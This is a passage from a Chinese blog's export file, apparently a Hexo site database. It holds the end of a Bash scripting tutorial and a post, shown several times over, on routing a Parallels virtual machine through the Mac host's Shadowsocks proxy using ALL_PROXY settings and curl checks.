class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    命令序列3</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">这是包含二层嵌套的条件语句，当<span class=\"string\">\"条件表达式1\"</span>为真时，执行<span class=\"string\">\"命令序列1\"</span>,否则，在<span class=\"string\">\"条件表</span></span><br><span class=\"line\"><span class=\"string\">达式2\"</span>为真的情况下，执行<span class=\"string\">\"命令序列2\"</span>，否则，执行<span class=\"string\">\"命令序列3\"</span>,<span class=\"string\">\"命令序列3\"</span>属于第2个条</span><br><span class=\"line\">件语句的一部分。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 判断输入的路径是文件还是目录</span></span><br><span class=\"line\"><span class=\"built_in\">read</span> -p <span class=\"string\">'please input the file path: '</span> file</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -d <span class=\"variable\">$file</span> ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'this is a directory'</span></span><br><span class=\"line\"><span class=\"keyword\">elif</span> [ -f <span class=\"variable\">$file</span> ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'this is a file'</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'wrong file type, or the file do not exist'</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"数字操作符\"><a href=\"#数字操作符\" class=\"headerlink\" title=\"数字操作符\"></a>数字操作符</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n1 –eq n2判断数字n1与n2是否相等，若相等，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –ne n2判断数字n1与n2是否不等，若不等，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –lt n2判断数字n1是否小于n2，若是，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –gt n2判断数字n1是否大于n2，若是，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –le n2判断数字n1是否小于或等于n2，若是，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">n1 –ge n2 判断数字n1是否大于或等于n2，若是，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"字符串操作符\"><a href=\"#字符串操作符\" class=\"headerlink\" title=\"字符串操作符\"></a>字符串操作符</h4><figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">string </span>若字符串<span class=\"keyword\">string非空，则返回真</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">-n </span><span class=\"keyword\">string </span>若字符串<span class=\"keyword\">string长度大于0，则返回真</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">-z </span><span class=\"keyword\">string </span>若字符串<span class=\"keyword\">string长度为0，则为返回真</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">string1 </span>= <span class=\"keyword\">string2 </span>若字符串<span class=\"keyword\">string1和string2相等，则返回真</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">string1 </span>!= <span class=\"keyword\">string2 </span>若字符串<span class=\"keyword\">string1和 </span><span class=\"keyword\">string2不等，则返回真</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"逻辑操作符\"><a href=\"#逻辑操作符\" class=\"headerlink\" title=\"逻辑操作符\"></a>逻辑操作符</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">e1 –a e2\t逻辑表达式e1和e2同时为真时，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\">e1 –o e2\t逻辑表达式e1和e2有一个为真时，返回<span class=\"number\">0</span>，否则，返回<span class=\"number\">1</span></span><br><span class=\"line\">! e1\t    若逻辑表达式e1不为真时，返回<span class=\"number\">0</span>，,否则，返回<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"循环语句\"><a href=\"#循环语句\" class=\"headerlink\" title=\"循环语句\"></a>循环语句</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> 变量名 <span class=\"keyword\">in</span> 参数列表</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    命令列表</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\">将<span class=\"string\">\"参数列表\"</span>中的元素依次赋给<span class=\"string\">\"变量名\"</span>，在每次赋值后执行<span class=\"string\">\"命令列表\"</span>，<span class=\"string\">\"参数列表\"</span>表示<span class=\"string\">\"变</span></span><br><span class=\"line\"><span class=\"string\">量名\"</span>的取值范围</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> ((初始化变量值；结束循环条件；运算))</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    命令序列</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> [ 条件表达式 ]</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    命令列表</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\">循环执行<span class=\"string\">\"命令列表\"</span>中的命令，直至<span class=\"string\">\"条件表达式\"</span>的值为假。</span><br><span class=\"line\"></span><br><span class=\"line\">Until [ 条件 ]</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    命令序列</span><br><span class=\"line\">Done</span><br><span class=\"line\">直到条件满足时循环结束</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 将指定目录下(参数传递$1)的所有以.txt为后缀的文件更名为*.doc</span></span><br><span class=\"line\">directory=<span class=\"variable\">$1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ ! <span class=\"variable\">$directory</span> ]</span><br><span class=\"line\">  <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"please input the argument directory\"</span></span><br><span class=\"line\">  <span class=\"built_in\">exit</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">files=`ls <span class=\"variable\">$&#123;directory&#125;</span>`</span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> <span class=\"variable\">$files</span>;</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ -f <span class=\"variable\">$&#123;file&#125;</span> ]</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"variable\">$file</span></span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    suffix=<span class=\"variable\">$&#123;file#*\\.&#125;</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"variable\">$suffix</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> [[ <span class=\"variable\">$suffix</span> == <span class=\"string\">\"txt\"</span> ]]</span><br><span class=\"line\">      <span class=\"keyword\">then</span></span><br><span class=\"line\">      prefix=<span class=\"variable\">$&#123;file%\\.*&#125;</span></span><br><span class=\"line\">      mv <span class=\"variable\">$directory</span>/<span class=\"variable\">$file</span> <span class=\"variable\">$directory</span>/<span class=\"variable\">$prefix</span>.doc</span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"title\">functionname</span></span>() &#123;</span><br><span class=\"line\">    命令列表</span><br><span class=\"line\">    <span class=\"built_in\">return</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">函数的调用方式为：</span><br><span class=\"line\">functionname arguments</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"Mac设置虚拟机使用宿主机代理","abbrlink":24292,"_content":"\n\n### 前言\n\n前提：mac 本身已经安装 ss，并且可以通过 ss 科学上网（或者 win 也一样）\n想要实现：Parallels Desktop 里的虚拟机也想科学上网（或者 win 里安装 vmware 也一样，或者是另一台物理机也是一样的）\n\n<!--more-->\n\n### 方法一：虚拟机也安装一个 ss 客户端\n\n对于有窗口的系统，比如你虚拟机里安装的是 win、或者 ubuntu 等，那么再安装一个客户端是很方便的，这就相当于在另一台电脑里使用 ss 客户端，既然 mac 上你会用了，那在其他电脑上也是一样的。\n\n但是如果虚拟机里是最小化安装的纯命令行的 centos，那么使用客户端可能有一定的麻烦，yum 无法安装，pip 安装的感觉也是 ssserver，并没有客户端，所以客户端还得编译，编译还有很多依赖，编译好还得写对配置文件，很多人都不太清楚这个，所以还是挺麻烦的。\n\n### 方法二：虚拟机设置代理到宿主机\n\n即虚拟机里设置代理到 mac（这里 mac 就是虚拟机的宿主机），让虚拟机通过 mac 的 ss 科学上网，这里如果宿主机换成 win，虚拟机软件换成 vmware 或 virtualbox，它的原理也都是一样的。\n\n**设置方法：**\n\n1、首先把宿主机的 ss 设置里的 Local Socks5 Listen Address 由原来的`127.0.0.1`设置为`0.0.0.0`，如果需要通过 HTTP 代理，那么也要把 ss 里的 HTTP 选项打开，并把 HTTP proxy Listen Address 地址由原来的`127.0.0.1`设置为`0.0.0.0`，这样做表示代理所有 ip，而不只是本机的`127.0.0.1`。如果用的是其他科学上网工具，也有些写成 “share over LAN(通过局域网共享)”，如果有这个选项，选上了就表示监听`0.0.0.0`。\n\n2、搞清楚虚拟机是通过什么方式联网的，虚拟机连网无非有两种方式：\n\n*   桥接\n*   NAT\n\n如果是桥接连网，那么只要找出宿主机的联网 ip 即可（mac 的话，一般都是 wifi，或者通过转接头插网线的话，那就是转接头对应的 ip）\n\n如果是 NAT 连网的，那么要找出宿主机中 NAT 网卡的 ip（在 mac 里使用 parallels desktop 虚拟机的话，NAT 网卡一般是 parallels Shared 开头的）\n\n3、在虚拟机里的`~/.bashrc`或`~/.zshrc`里，添加以下两句的其中一句：\n\n一般填入局域网IP即可\n\n```\nexport ALL_PROXY=SOCKS5://IP:端口\nexport ALL_PROXY=HTTP://IP:端口\n```\n\n第一句表示使用 SOCKS5 代理，第二句表示使用 HTTP 代理，ip 就是第 2 步中找到的 ip，端口就是 ss 对应的端口，打开 ss 的设置里就有，一般 ss 有两个端口，一个 socks5 端口，一个 http 端口，找到对应端口填进去即可。\n\n最后 source 一下配置文件：\n```\nsource ~/.bashrc\n```\n或者用 zsh shell 的话就是：\n```\nsource ~/.zshrc\n```\n\n测试 ip 是哪里的：\n\n```\ncurl https://ip.cn\n```\n\n如果显示的是代理服务器所在地址 (比如美国) 和 ip，那说明代理设置成功。\n\n然后试试能否访问 google：\n```\ncurl https://www.google.com\n```\n\n如果是 Windows，可以直接在 cmd 里设用`set http_proxy=http://127.0.0.1:1087`，`set https_proxy=http://127.0.0.1:1087`，`set all_proxy=http://127.0.0.1:1087`\n\n* * *\n\n更好的写法\n\n```\n# 设置使用代理\nalias setproxy=\"export https_proxy=http://127.0.0.1:1087; export http_proxy=http://127.0.0.1:1087; export all_proxy=socks5://127.0.0.1:1086; echo 'Set proxy successfully'\"\n# 设置取消使用代理\nalias unsetproxy=\"unset http_proxy; unset https_proxy; unset all_proxy; echo 'Unset proxy successfully'\"\n```\n\n\n\n\n\n","source":"_posts/2019/9/Mac设置虚拟机使用宿主机代理.md","raw":"---\nlayout: post\ntitle: Mac设置虚拟机使用宿主机代理\ntags:\n  - mac\ncategories:\n  - 科学上网\nabbrlink: 24292\n---\n\n\n### 前言\n\n前提：mac 本身已经安装 ss，并且可以通过 ss 科学上网（或者 win 也一样）\n想要实现：Parallels Desktop 里的虚拟机也想科学上网（或者 win 里安装 vmware 也一样，或者是另一台物理机也是一样的）\n\n<!--more-->\n\n### 方法一：虚拟机也安装一个 ss 客户端\n\n对于有窗口的系统，比如你虚拟机里安装的是 win、或者 ubuntu 等，那么再安装一个客户端是很方便的，这就相当于在另一台电脑里使用 ss 客户端，既然 mac 上你会用了，那在其他电脑上也是一样的。\n\n但是如果虚拟机里是最小化安装的纯命令行的 centos，那么使用客户端可能有一定的麻烦，yum 无法安装，pip 安装的感觉也是 ssserver，并没有客户端，所以客户端还得编译，编译还有很多依赖，编译好还得写对配置文件，很多人都不太清楚这个，所以还是挺麻烦的。\n\n### 方法二：虚拟机设置代理到宿主机\n\n即虚拟机里设置代理到 mac（这里 mac 就是虚拟机的宿主机），让虚拟机通过 mac 的 ss 科学上网，这里如果宿主机换成 win，虚拟机软件换成 vmware 或 virtualbox，它的原理也都是一样的。\n\n**设置方法：**\n\n1、首先把宿主机的 ss 设置里的 Local Socks5 Listen Address 由原来的`127.0.0.1`设置为`0.0.0.0`，如果需要通过 HTTP 代理，那么也要把 ss 里的 HTTP 选项打开，并把 HTTP proxy Listen Address 地址由原来的`127.0.0.1`设置为`0.0.0.0`，这样做表示代理所有 ip，而不只是本机的`127.0.0.1`。如果用的是其他科学上网工具，也有些写成 “share over LAN(通过局域网共享)”，如果有这个选项，选上了就表示监听`0.0.0.0`。\n\n2、搞清楚虚拟机是通过什么方式联网的，虚拟机连网无非有两种方式：\n\n*   桥接\n*   NAT\n\n如果是桥接连网，那么只要找出宿主机的联网 ip 即可（mac 的话，一般都是 wifi，或者通过转接头插网线的话，那就是转接头对应的 ip）\n\n如果是 NAT 连网的，那么要找出宿主机中 NAT 网卡的 ip（在 mac 里使用 parallels desktop 虚拟机的话，NAT 网卡一般是 parallels Shared 开头的）\n\n3、在虚拟机里的`~/.bashrc`或`~/.zshrc`里，添加以下两句的其中一句：\n\n一般填入局域网IP即可\n\n```\nexport ALL_PROXY=SOCKS5://IP:端口\nexport ALL_PROXY=HTTP://IP:端口\n```\n\n第一句表示使用 SOCKS5 代理，第二句表示使用 HTTP 代理，ip 就是第 2 步中找到的 ip，端口就是 ss 对应的端口，打开 ss 的设置里就有，一般 ss 有两个端口，一个 socks5 端口，一个 http 端口，找到对应端口填进去即可。\n\n最后 source 一下配置文件：\n```\nsource ~/.bashrc\n```\n或者用 zsh shell 的话就是：\n```\nsource ~/.zshrc\n```\n\n测试 ip 是哪里的：\n\n```\ncurl https://ip.cn\n```\n\n如果显示的是代理服务器所在地址 (比如美国) 和 ip，那说明代理设置成功。\n\n然后试试能否访问 google：\n```\ncurl https://www.google.com\n```\n\n如果是 Windows，可以直接在 cmd 里设用`set http_proxy=http://127.0.0.1:1087`，`set https_proxy=http://127.0.0.1:1087`，`set all_proxy=http://127.0.0.1:1087`\n\n* * *\n\n更好的写法\n\n```\n# 设置使用代理\nalias setproxy=\"export https_proxy=http://127.0.0.1:1087; export http_proxy=http://127.0.0.1:1087; export all_proxy=socks5://127.0.0.1:1086; echo 'Set proxy successfully'\"\n# 设置取消使用代理\nalias unsetproxy=\"unset http_proxy; unset https_proxy; unset all_proxy; echo 'Unset proxy successfully'\"\n```\n\n\n\n\n\n","slug":"2019/9/Mac设置虚拟机使用宿主机代理","published":1,"date":"2019-09-28T08:36:19.326Z","updated":"2020-04-12T06:34:43.627Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzv001n44vq9idusgsm","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>前提：mac 本身已经安装 ss，并且可以通过 ss 科学上网（或者 win 也一样）<br>想要实现：Parallels Desktop 里的虚拟机也想科学上网（或者 win 里安装 vmware 也一样，或者是另一台物理机也是一样的）</p>\n<a id=\"more\"></a>\n<h3 id=\"方法一：虚拟机也安装一个-ss-客户端\"><a href=\"#方法一：虚拟机也安装一个-ss-客户端\" class=\"headerlink\" title=\"方法一：虚拟机也安装一个 ss 客户端\"></a>方法一：虚拟机也安装一个 ss 客户端</h3><p>对于有窗口的系统，比如你虚拟机里安装的是 win、或者 ubuntu 等，那么再安装一个客户端是很方便的，这就相当于在另一台电脑里使用 ss 客户端，既然 mac 上你会用了，那在其他电脑上也是一样的。</p>\n<p>但是如果虚拟机里是最小化安装的纯命令行的 centos，那么使用客户端可能有一定的麻烦，yum 无法安装，pip 安装的感觉也是 ssserver，并没有客户端，所以客户端还得编译，编译还有很多依赖，编译好还得写对配置文件，很多人都不太清楚这个，所以还是挺麻烦的。</p>\n<h3 id=\"方法二：虚拟机设置代理到宿主机\"><a href=\"#方法二：虚拟机设置代理到宿主机\" class=\"headerlink\" title=\"方法二：虚拟机设置代理到宿主机\"></a>方法二：虚拟机设置代理到宿主机</h3><p>即虚拟机里设置代理到 mac（这里 mac 就是虚拟机的宿主机），让虚拟机通过 mac 的 ss 科学上网，这里如果宿主机换成 win，虚拟机软件换成 vmware 或 virtualbox，它的原理也都是一样的。</p>\n<p><strong>设置方法：</strong></p>\n<p>1、首先把宿主机的 ss 设置里的 Local Socks5 Listen Address 由原来的<code>127.0.0.1</code>设置为<code>0.0.0.0</code>，如果需要通过 HTTP 代理，那么也要把 ss 里的 HTTP 选项打开，并把 HTTP proxy Listen Address 地址由原来的<code>127.0.0.1</code>设置为<code>0.0.0.0</code>，这样做表示代理所有 ip，而不只是本机的<code>127.0.0.1</code>。如果用的是其他科学上网工具，也有些写成 “share over LAN(通过局域网共享)”，如果有这个选项，选上了就表示监听<code>0.0.0.0</code>。</p>\n<p>2、搞清楚虚拟机是通过什么方式联网的，虚拟机连网无非有两种方式：</p>\n<ul>\n<li>桥接</li>\n<li>NAT</li>\n</ul>\n<p>如果是桥接连网，那么只要找出宿主机的联网 ip 即可（mac 的话，一般都是 wifi，或者通过转接头插网线的话，那就是转接头对应的 ip）</p>\n<p>如果是 NAT 连网的，那么要找出宿主机中 NAT 网卡的 ip（在 mac 里使用 parallels desktop 虚拟机的话，NAT 网卡一般是 parallels Shared 开头的）</p>\n<p>3、在虚拟机里的<code>~/.bashrc</code>或<code>~/.zshrc</code>里，添加以下两句的其中一句：</p>\n<p>一般填入局域网IP即可</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"builtin-name\">export</span> <span class=\"attribute\">ALL_PROXY</span>=SOCKS5://IP:端口</span><br><span class=\"line\"><span class=\"builtin-name\">export</span> <span class=\"attribute\">ALL_PROXY</span>=HTTP://IP:端口</span><br></pre></td></tr></table></figure>\n<p>第一句表示使用 SOCKS5 代理，第二句表示使用 HTTP 代理，ip 就是第 2 步中找到的 ip，端口就是 ss 对应的端口，打开 ss 的设置里就有，一般 ss 有两个端口，一个 socks5 端口，一个 http 端口，找到对应端口填进去即可。</p>\n<p>最后 source 一下配置文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure></p>\n<p>或者用 zsh shell 的话就是：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></p>\n<p>测试 ip 是哪里的：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl <span class=\"string\">https:</span><span class=\"comment\">//ip.cn</span></span><br></pre></td></tr></table></figure>\n<p>如果显示的是代理服务器所在地址 (比如美国) 和 ip，那说明代理设置成功。</p>\n<p>然后试试能否访问 google：<br><figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl <span class=\"string\">https:</span><span class=\"comment\">//www.google.com</span></span><br></pre></td></tr></table></figure></p>\n<p>如果是 Windows，可以直接在 cmd 里设用<code>set http_proxy=http://127.0.0.1:1087</code>，<code>set https_proxy=http://127.0.0.1:1087</code>，<code>set all_proxy=http://127.0.0.1:1087</code></p>\n<hr>\n<p>更好的写法</p>\n<figure class=\"highlight monkey\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># 设置使用代理</span></span><br><span class=\"line\"><span class=\"keyword\">alias</span> <span class=\"title\">setproxy</span>=<span class=\"string\">\"export https_proxy=http://127.0.0.1:1087; export http_proxy=http://127.0.0.1:1087; export all_proxy=socks5://127.0.0.1:1086; echo 'Set proxy successfully'\"</span></span><br><span class=\"line\"><span class=\"meta\"># 设置取消使用代理</span></span><br><span class=\"line\"><span class=\"keyword\">alias</span> <span class=\"title\">unsetproxy</span>=<span class=\"string\">\"unset http_proxy; unset https_proxy; unset all_proxy; echo 'Unset proxy successfully'\"</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>前提：mac 本身已经安装 ss，并且可以通过 ss 科学上网（或者 win 也一样）<br>想要实现：Parallels Desktop 里的虚拟机也想科学上网（或者 win 里安装 vmware 也一样，或者是另一台物理机也是一样的）</p>","more":"<h3 id=\"方法一：虚拟机也安装一个-ss-客户端\"><a href=\"#方法一：虚拟机也安装一个-ss-客户端\" class=\"headerlink\" title=\"方法一：虚拟机也安装一个 ss 客户端\"></a>方法一：虚拟机也安装一个 ss 客户端</h3><p>对于有窗口的系统，比如你虚拟机里安装的是 win、或者 ubuntu 等，那么再安装一个客户端是很方便的，这就相当于在另一台电脑里使用 ss 客户端，既然 mac 上你会用了，那在其他电脑上也是一样的。</p>\n<p>但是如果虚拟机里是最小化安装的纯命令行的 centos，那么使用客户端可能有一定的麻烦，yum 无法安装，pip 安装的感觉也是 ssserver，并没有客户端，所以客户端还得编译，编译还有很多依赖，编译好还得写对配置文件，很多人都不太清楚这个，所以还是挺麻烦的。</p>\n<h3 id=\"方法二：虚拟机设置代理到宿主机\"><a href=\"#方法二：虚拟机设置代理到宿主机\" class=\"headerlink\" title=\"方法二：虚拟机设置代理到宿主机\"></a>方法二：虚拟机设置代理到宿主机</h3><p>即虚拟机里设置代理到 mac（这里 mac 就是虚拟机的宿主机），让虚拟机通过 mac 的 ss 科学上网，这里如果宿主机换成 win，虚拟机软件换成 vmware 或 virtualbox，它的原理也都是一样的。</p>\n<p><strong>设置方法：</strong></p>\n<p>1、首先把宿主机的 ss 设置里的 Local Socks5 Listen Address 由原来的<code>127.0.0.1</code>设置为<code>0.0.0.0</code>，如果需要通过 HTTP 代理，那么也要把 ss 里的 HTTP 选项打开，并把 HTTP proxy Listen Address 地址由原来的<code>127.0.0.1</code>设置为<code>0.0.0.0</code>，这样做表示代理所有 ip，而不只是本机的<code>127.0.0.1</code>。如果用的是其他科学上网工具，也有些写成 “share over LAN(通过局域网共享)”，如果有这个选项，选上了就表示监听<code>0.0.0.0</code>。</p>\n<p>2、搞清楚虚拟机是通过什么方式联网的，虚拟机连网无非有两种方式：</p>\n<ul>\n<li>桥接</li>\n<li>NAT</li>\n</ul>\n<p>如果是桥接连网，那么只要找出宿主机的联网 ip 即可（mac 的话，一般都是 wifi，或者通过转接头插网线的话，那就是转接头对应的 ip）</p>\n<p>如果是 NAT 连网的，那么要找出宿主机中 NAT 网卡的 ip（在 mac 里使用 parallels desktop 虚拟机的话，NAT 网卡一般是 parallels Shared 开头的）</p>\n<p>3、在虚拟机里的<code>~/.bashrc</code>或<code>~/.zshrc</code>里，添加以下两句的其中一句：</p>\n<p>一般填入局域网IP即可</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"builtin-name\">export</span> <span class=\"attribute\">ALL_PROXY</span>=SOCKS5://IP:端口</span><br><span class=\"line\"><span class=\"builtin-name\">export</span> <span class=\"attribute\">ALL_PROXY</span>=HTTP://IP:端口</span><br></pre></td></tr></table></figure>\n<p>第一句表示使用 SOCKS5 代理，第二句表示使用 HTTP 代理，ip 就是第 2 步中找到的 ip，端口就是 ss 对应的端口，打开 ss 的设置里就有，一般 ss 有两个端口，一个 socks5 端口，一个 http 端口，找到对应端口填进去即可。</p>\n<p>最后 source 一下配置文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure></p>\n<p>或者用 zsh shell 的话就是：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></p>\n<p>测试 ip 是哪里的：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl <span class=\"string\">https:</span><span class=\"comment\">//ip.cn</span></span><br></pre></td></tr></table></figure>\n<p>如果显示的是代理服务器所在地址 (比如美国) 和 ip，那说明代理设置成功。</p>\n<p>然后试试能否访问 google：<br><figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl <span class=\"string\">https:</span><span class=\"comment\">//www.google.com</span></span><br></pre></td></tr></table></figure></p>\n<p>如果是 Windows，可以直接在 cmd 里设用<code>set http_proxy=http://127.0.0.1:1087</code>，<code>set https_proxy=http://127.0.0.1:1087</code>，<code>set 